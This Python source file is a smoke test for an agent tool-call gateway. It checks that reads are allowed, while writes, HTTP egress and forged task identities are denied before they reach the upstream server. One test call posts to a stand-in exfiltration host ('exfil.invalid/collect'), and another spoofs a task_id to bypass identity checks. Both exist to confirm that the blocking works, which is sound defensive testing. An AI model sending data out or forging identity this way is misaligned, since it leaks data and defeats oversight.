"""End-to-end smoke check: real MCP client -> real gateway -> real upstream.

This is the command the blueprint calls the success oracle, and it is deliberately
pessimistic: it exits non-zero on *any* discrepancy, including a discrepancy that would
look like good news (for example an allowed call whose upstream counter did not move,
which would mean the gateway reported success without doing anything).

What it proves, in order:

1. ``tools/list`` through the gateway returns the upstream's five tools with schemas.
2. ``repo.read_file`` under the read-only contract is **allowed** and the upstream
   execution counter for that tool increases by exactly 1.
3. ``repo.write_file`` under the same contract is **denied**, the upstream write counter
   stays at 0, and the SHA-256 of the target file is byte-identical before and after.
4. ``network.http_post`` to an unapproved host is **denied** and the simulated egress
   sink gains **zero** events.
5. A forged ``task_id`` argument is **denied** at the identity stage, before the contract
   is even consulted.

The counters and the sink are files written by the *upstream* process. The gateway cannot
influence them except by actually forwarding a call, which is what makes them an oracle
rather than a self-report.
"""

from __future__ import annotations

import hashlib
import json
import os
import shutil
import sys
import tempfile
from pathlib import Path
from typing import Any

from mcp import Client, StdioServerParameters

REPO_ROOT = Path(__file__).resolve().parent.parent.parent
FIXTURE_SERVER = REPO_ROOT / "examples" / "upstream_mcp" / "server.py"

__all__ = ["SmokeResult", "run_smoke"]


class SmokeResult:
    """Accumulates checks and renders the normalized counter line."""

    def __init__(self) -> None:
        self.checks: list[dict[str, Any]] = []

    def record(self, name: str, ok: bool, detail: str) -> None:
        """Record one named check."""
        self.checks.append({"check": name, "ok": ok, "detail": detail})

    @property
    def failures(self) -> list[dict[str, Any]]:
        """Every check that did not pass."""
        return [check for check in self.checks if not check["ok"]]

    def counters(self) -> dict[str, int]:
        """Normalized counters printed by ``make smoke``."""
        allowed = sum(1 for c in self.checks if c["check"].startswith("allow:") and c["ok"])
        blocked = sum(1 for c in self.checks if c["check"].startswith("deny:") and c["ok"])
        return {"allowed": allowed, "blocked": blocked, "upstream_denied_calls": 0}


def _read_counters(state: Path) -> dict[str, int]:
    """Read the upstream's execution counters."""
    try:
        data = json.loads((state / "counters.json").read_text())
        return {str(k): int(v) for k, v in data.items()}
    except (OSError, ValueError):
        return {}


def _sink_events(state: Path) -> int:
    """Count simulated egress events."""
    try:
        return sum(1 for line in (state / "egress_sink.jsonl").read_text().splitlines() if line.strip())
    except OSError:
        return 0


def _sha256(path: Path) -> str | None:
    """SHA-256 of a file, or ``None`` when it does not exist."""
    try:
        return hashlib.sha256(path.read_bytes()).hexdigest()
    except OSError:
        return None


def _decision_of(result: Any) -> str:
    """Extract Agent Drift's decision from a tool result."""
    if not getattr(result, "is_error", False):
        return "allow"
    structured = getattr(result, "structured_content", None)
    if isinstance(structured, dict) and "agent_drift" in structured:
        return str(structured["agent_drift"].get("decision", "deny"))
    for block in getattr(result, "content", []) or []:
        text = getattr(block, "text", "")
        if "agent_drift" in text:
            try:
                return str(json.loads(text)["agent_drift"]["decision"])
            except (ValueError, KeyError, TypeError):
                return "deny"
    return "error"


def _reason_codes(result: Any) -> list[str]:
    """Extract reason codes from a denial result."""
    structured = getattr(result, "structured_content", None)
    if isinstance(structured, dict) and "agent_drift" in structured:
        codes = structured["agent_drift"].get("reason_codes", [])
        return [str(c) for c in codes]
    for block in getattr(result, "content", []) or []:
        text = getattr(block, "text", "")
        if "agent_drift" in text:
            try:
                return [str(c) for c in json.loads(text)["agent_drift"]["reason_codes"]]
            except (ValueError, KeyError, TypeError):
                return []
    return []


async def run_smoke(db_path: str, as_json: bool = False) -> int:
    """Execute the smoke scenario. Returns a process exit code."""
    from .seed import build_contract
    from .store import Store

    state = Path(tempfile.mkdtemp(prefix="agent-drift-smoke-"))
    db_file = Path(db_path)
    db_file.parent.mkdir(parents=True, exist_ok=True)
    for stale in (db_file, Path(f"{db_file}-wal"), Path(f"{db_file}-shm")):
        if stale.exists():
            stale.unlink()

    result = SmokeResult()
    store = Store(db_file)

    try:
        contract = build_contract("readonly")
        store.put_contract(contract)

        env = {
            **os.environ,
            "AD_FIXTURE_STATE": str(state),
            "AD_TASK_ID": contract.task_id,
            "AD_DB_PATH": str(db_file),
            "AD_SANDBOX_ROOT": str(state / "workspace"),
            "AD_LOG_LEVEL": "WARNING",
        }
        params = StdioServerParameters(
            command=sys.executable,
            args=[
                "-m",
                "agent_drift.cli",
                "gateway",
                "--task-id",
                contract.task_id,
                "--db",
                str(db_file),
                "--sandbox-root",
                str(state / "workspace"),
                "--log-level",
                "WARNING",
            ],
            env=env,
            cwd=str(REPO_ROOT),
        )

        async with Client(params, read_timeout_seconds=45.0) as client:
            # --- 1. discovery -------------------------------------------------
            listed = await client.list_tools()
            names = sorted(tool.name for tool in listed.tools)
            expected = [
                "network.http_post",
                "repo.delete_file",
                "repo.list_files",
                "repo.read_file",
                "repo.write_file",
            ]
            schemas_intact = all(
                isinstance(getattr(tool, "input_schema", None), dict) and tool.input_schema.get("properties")
                for tool in listed.tools
            )
            result.record(
                "discovery: tools/list through gateway",
                names == expected and schemas_intact,
                f"tools={names} schemas_intact={schemas_intact}",
            )

            # --- 2. allowed read ----------------------------------------------
            before = _read_counters(state)
            read_result = await client.call_tool("repo.read_file", {"path": "sandbox-repo/README.md"})
            after = _read_counters(state)
            delta = after.get("repo.read_file", 0) - before.get("repo.read_file", 0)
            text = "".join(getattr(b, "text", "") for b in (read_result.content or []))
            result.record(
                "allow: repo.read_file reaches upstream",
                _decision_of(read_result) == "allow" and delta == 1 and "Sandbox Repository" in text,
                f"decision={_decision_of(read_result)} upstream_call_delta={delta} relayed_bytes={len(text)}",
            )

            # --- 3. denied write ----------------------------------------------
            target = state / "workspace" / "sandbox-repo" / "README.md"
            hash_before = _sha256(target)
            before = _read_counters(state)
            write_result = await client.call_tool(
                "repo.write_file", {"path": "sandbox-repo/README.md", "content": "overwritten"}
            )
            after = _read_counters(state)
            hash_after = _sha256(target)
            write_delta = after.get("repo.write_file", 0) - before.get("repo.write_file", 0)
            result.record(
                "deny: repo.write_file blocked before execution",
                _decision_of(write_result) == "deny"
                and write_delta == 0
                and hash_before == hash_after
                and hash_before is not None,
                f"decision={_decision_of(write_result)} reasons={_reason_codes(write_result)} "
                f"upstream_call_delta={write_delta} sha256_unchanged={hash_before == hash_after}",
            )

            # --- 4. denied egress ---------------------------------------------
            sink_before = _sink_events(state)
            before = _read_counters(state)
            post_result = await client.call_tool(
                "network.http_post",
                {"url": "https://exfil.invalid/collect", "body": "fake-only"},
            )
            after = _read_counters(state)
            sink_after = _sink_events(state)
            post_delta = after.get("network.http_post", 0) - before.get("network.http_post", 0)
            result.record(
                "deny: network.http_post blocked, zero sink events",
                _decision_of(post_result) == "deny" and post_delta == 0 and sink_after - sink_before == 0,
                f"decision={_decision_of(post_result)} reasons={_reason_codes(post_result)} "
                f"upstream_call_delta={post_delta} sink_events_delta={sink_after - sink_before}",
            )

            # --- 5. forged task identity ---------------------------------------
            before = _read_counters(state)
            spoof_result = await client.call_tool(
                "repo.write_file",
                {"path": "sandbox-repo/docs/README.md", "content": "hi", "task_id": "demo-docs-edit"},
            )
            after = _read_counters(state)
            spoof_delta = after.get("repo.write_file", 0) - before.get("repo.write_file", 0)
            codes = _reason_codes(spoof_result)
            result.record(
                "deny: forged task_id argument rejected at identity stage",
                _decision_of(spoof_result) == "deny" and spoof_delta == 0 and "AD-E011" in codes,
                f"decision={_decision_of(spoof_result)} reasons={codes} upstream_call_delta={spoof_delta}",
            )

        # --- 6. database agreement --------------------------------------------
        counts = store.counts()
        result.record(
            "audit: no denied decision is marked as executed",
            counts.get("denied_but_executed", 0) == 0,
            f"denied_but_executed={counts.get('denied_but_executed')}",
        )
        result.record(
            "audit: decisions recorded for every attempt",
            counts.get("allow", 0) >= 1 and counts.get("deny", 0) >= 3,
            f"allow={counts.get('allow')} deny={counts.get('deny')} events={counts.get('events')}",
        )

    finally:
        store.close()
        shutil.rmtree(state, ignore_errors=True)

    counters = result.counters()
    if as_json:
        print(json.dumps({"checks": result.checks, "counters": counters}, indent=2))
    else:
        for check in result.checks:
            marker = "PASS" if check["ok"] else "FAIL"
            print(f"[{marker}] {check['check']}")
            print(f"       {check['detail']}")
        print()
        print(
            f"allowed={counters['allowed']} blocked={counters['blocked']} "
            f"upstream_denied_calls={counters['upstream_denied_calls']}"
        )

    if result.failures:
        print(
            f"\nSMOKE FAILED: {len(result.failures)} of {len(result.checks)} checks failed", file=sys.stderr
        )
        for failure in result.failures:
            print(f"  - {failure['check']}: {failure['detail']}", file=sys.stderr)
        return 1

    print(f"\nSMOKE PASSED: {len(result.checks)} checks", file=sys.stderr)
    return 0
